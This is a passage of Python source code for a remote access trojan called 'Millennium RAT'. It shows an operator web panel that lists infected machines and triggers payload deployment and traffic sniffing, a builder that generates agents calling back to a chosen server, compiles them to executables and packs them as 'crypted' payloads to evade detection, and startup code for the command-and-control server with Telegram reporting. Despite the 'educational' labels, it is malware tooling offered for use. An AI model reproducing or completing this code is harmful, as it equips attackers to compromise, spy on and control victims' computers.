            print("[ADMIN TOOLKIT] Agent creation and compilation failed.")

    def send_comprehensive_report(self):
        """Send comprehensive report to Telegram"""
        self.telegram.create_comprehensive_report()

class MillenniumPanel:
    """Educational Web Panel for Millennium RAT"""

    def __init__(self, millennium_core):
        self.core = millennium_core
        self.app = Flask(__name__)
        self.setup_routes()

    def setup_routes(self):
        """Define Flask routes"""
        @self.app.route('/')
        def index():
            return "<h1>Millennium RAT Web Panel (Educational)</h1><p>See documentation for API endpoints.</p>"

        @self.app.route('/agents')
        def list_agents():
            agents = []
            for client_id, client_info in self.core.clients.items():
                agents.append({
                    'id': client_id,
                    'address': client_info['address'][0],
                    'port': client_info['address'][1],
                    'connected_at': str(client_info['connected_at']),
                    'system_info': client_info.get('system_info', {})
                })
            return jsonify(agents)

        @self.app.route('/deploy/<agent_id>', methods=['POST'])
        def deploy_payload(agent_id):
            payload_config = request.json
            success = self.core.deploy_payload_to_client(agent_id, payload_config)
            if success:
                return jsonify({'status': 'success'})
            else:
                return jsonify({'status': 'failed'})

        @self.app.route('/sniff/<agent_id>')
        def start_sniffing(agent_id):
            success = self.core.start_traffic_sniffing(agent_id)
            if success:
                return jsonify({'status': 'success'})
            else:
                return jsonify({'status': 'failed'})

    def run(self, port=5000):
        """Run the Flask application"""
        print(f"[WEB PANEL] Starting web panel on port {port}")
        self.app.run(debug=True, port=port)

class MillenniumBuilder:
    """Build Millennium RAT components"""

    def __init__(self, millennium_core, telegram_integration):
        self.core = millennium_core
        self.telegram = telegram_integration
        self.compiler = MillenniumCompiler()

    def display_builder_menu(self):
        """Display the builder menu"""
        print("""
[MILLENNIUM BUILDER]
1. Create Millennium Agent
2. Compile Millennium Agent to Executable
3. Create Crypted Payload
4. Exit
        """)

    def handle_builder_commands(self):
        """Handle commands from the builder menu"""
        while True:
            self.display_builder_menu()
            try:
                command = input("MillenniumBuilder> ").strip()

                if command == '1':
                    self.create_agent()
                elif command == '2':
                    self.compile_agent()
                elif command == '3':
                    self.create_crypted()
                elif command == '4':
                    break
                else:
                    print("[MILLENNIUM BUILDER] Unknown command.")

            except KeyboardInterrupt:
                print("\n[MILLENNIUM BUILDER] Returning to main shell...")
                break
            except Exception as e:
                print(f"[MILLENNIUM BUILDER] Error: {e}")

    def create_agent(self):
        """Create Millennium Agent"""
        server_ip = input("Enter server IP: ").strip() or "127.0.0.1"
        server_port = int(input("Enter server port: ").strip() or "8888")
        agent_code = self.core.create_millennium_agent(server_ip, server_port)
        file_path = f"millennium_agent_{int(time.time())}.py"
        with open(file_path, 'w') as f:
            f.write(agent_code)
        print(f"[MILLENNIUM BUILDER] Agent created: {file_path}")

    def compile_agent(self):
        """Compile Millennium Agent to Executable"""
        agent_file = input("Enter agent file path: ").strip()
        output_name = input("Enter output name (e.g., agent.exe): ").strip() or "millennium_agent.exe"

        try:
            with open(agent_file, 'r') as f:
                agent_code = f.read()
        except:
            print("[MILLENNIUM BUILDER] Could not read agent file.")
            return

        output_path = self.compiler.compile_agent_to_exe(agent_code, output_name)
        if output_path:
            print(f"[MILLENNIUM BUILDER] Agent compiled: {output_path}")
        else:
            print("[MILLENNIUM BUILDER] Compilation failed.")

    def create_crypted(self):
        """Create Crypted Payload"""
        executable_path = input("Enter executable path: ").strip()
        crypted_path = self.compiler.create_crypted_payload(executable_path)
        if crypted_path:
            print(f"[MILLENNIUM BUILDER] Crypted payload created: {crypted_path}")
        else:
            print("[MILLENNIUM BUILDER] Crypter failed.")

if __name__ == "__main__":
    # Configuration
    SERVER_PORT = 8888
    TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
    TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

    # Core and Integrations
    millennium_core = MillenniumRATCore()
    telegram_integration = TelegramIntegration(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)

    # Test Telegram Connection
    telegram_integration.test_telegram_connection()

    # Admin Toolkit Integration
    admin_toolkit = AdminToolkit(millennium_core, telegram_integration)
    threading.Thread(target=admin_toolkit.handle_toolkit_commands, daemon=True).start()

    # Start Millennium Server in separate thread
    server_thread = threading.Thread(target=millennium_core.start_millennium_server, args=(SERVER_PORT,), daemon=True)
    server_thread.start()

    # Start Interactive Shell in main thread
    millennium_core.interactive_millennium_shell()

    # Ensure server shuts down properly
    millennium_core.is_running = False
    server_thread.join()